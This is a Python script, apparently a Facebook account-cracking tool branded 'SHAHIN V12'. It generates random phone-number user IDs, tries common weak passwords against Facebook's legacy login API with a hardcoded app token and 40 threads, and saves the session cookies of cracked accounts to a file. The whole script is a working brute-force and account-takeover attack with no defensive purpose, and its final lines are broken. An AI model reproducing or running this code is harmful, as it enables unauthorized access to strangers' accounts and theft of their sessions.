import os, time, random, string, re, sys, requests, json, uuid
from concurrent.futures import ThreadPoolExecutor as ThreadPool

# Premium Color Palette
A = '\033[1;97m' # White
G = '\033[1;92m' # Neon Green
Y = '\033[1;93m' # Gold
S = '\033[1;96m' # Sky Blue

# Global Counters
loop, oks, cps = 0, [], []

def line():
    print(f'{S}╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸╸{A}')

def logo():
    os.system('clear')
    print(f'''{G}
 ███████ ██   ██  █████  ██   ██ ██ ███    ██ 
 ██      ██   ██ ██   ██ ██   ██ ██ ████   ██ 
 ███████ ███████ ███████ ███████ ██ ██ ██  ██ 
      ██ ██   ██ ██   ██ ██   ██ ██ ██  ██ ██ 
 ███████ ██   ██ ██   ██ ██   ██ ██ ██   ████ {Y}V12{A}''')
    line()
    print(f' {A}[{G}•{A}] OWNER    : {G}SHAHIN BIN AHMED')
    print(f' {A}[{G}•{A}] NETWORK  : {Y}WIFI SPECIAL (ANTI-BLOCK)')
    print(f' {A}[{G}•{A}] STATUS   : {G}PREMIUM ACTIVATED')
    line()

def Main():
    logo()
    print(f' {G}[1]{A} START WIFI RANDOM CLONE {G}(FAST)')
    print(f' {G}[0]{A} EXIT')
    line()
    opt = input(f' {A}[{G}•{A}] CHOOSE : {G}')
    if opt in ['1', '01']: bd_menu()
    else: exit()

def bd_menu():
    logo()
    print(f' {A}[{G}•{A}] EXAMPLE : 017, 018, 019, 016')
    code = input(f' {A}[{G}+] CODE : {G}')
    limit = int(input(f' {A}[{G}+] LIMIT: {G}'))
    
    # WiFi-te 35-45 workers thakle net stuck hoy na kintu speed bhalo thake
    with ThreadPool(max_workers=40) as v12:
        logo()
        print(f' {A}[{G}•{A}] TOTAL TARGET : {limit}')
        print(f' {A}[{G}•{A}] WIFI STABILITY : {G}ENABLED')
        line()
        for _ in range(limit):
            num = ''.join(random.choice(string.digits) for _ in range(8))
            uid = code + num
            # WiFi-r jonno common kintu powerful password set
            pws = [uid, num, uid[:6], uid[:7], uid[:8], '123456', '1234567', 'shahin123', 'shahin786', '708090']
            v12.submit(engine_v12, uid, pws, limit)

def engine_v12(uid, pws, limit):
    global loop
    # WiFi-friendly Desktop/PC User Agents
    ua = random.choice([
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(115,124)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(110,123)}.0.0.0 Safari/537.36",
        f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    ])
    
    for pw in pws:
        session = requests.Session()
        headers = {
            'User-Agent': ua,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'X-FB-HTTP-Engine': 'Liger'
        }
        data = {
            'adid': str(uuid.uuid4()),
            'email': uid,
            'password': pw,
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'credentials_type': 'password',
            'generate_session_cookies': '1'
        }
        try:
            # Smart API Switcher
            url = random.choice(['https://b-api.facebook.com/method/auth.login', 'https://b-graph.facebook.com/auth/login'])
            res = session.post(url, data=data, headers=headers).json()
            
            if 'session_key' in res:
                coki = ";".join(i["name"]+"="+i["value"] for i in res["session_cookies"])
                print(f'\r\r{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                print(f' {G}[SHAHIN-OK] {uid} | {pw}')
                print(f' {Y}[COOKIE] {A}{coki}')
                print(f'{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{A}')
                
                with open('SHAHIN-OK.txt', 'a') as f:
                    f.write(f'{uid}|{pw}|{coki}\n')
                
                os.system('espeak -a 300 "Shahin OK ID Found"')
                oks.append(uid)
                break
                
            elif 'www.facebook.com' in str(res):
                print(f'\r\r{Y}[SHAHIN-CP] {uid} | {pw}{A}')
                cps.append(uid)
                break
        except: 
            # WiFi recovery delay
            time.sleep(0.5)
            pass
        
    loop += 1
    sys.stdout.write(f'\r\r {A}[CLONING] {loop}/{limit} OK:{G}{len(oks)}{A} CP:{Y}{len(cps)}{A} '); sys.stdout.flush()

if __name__ == "__main__":
    Main
    import
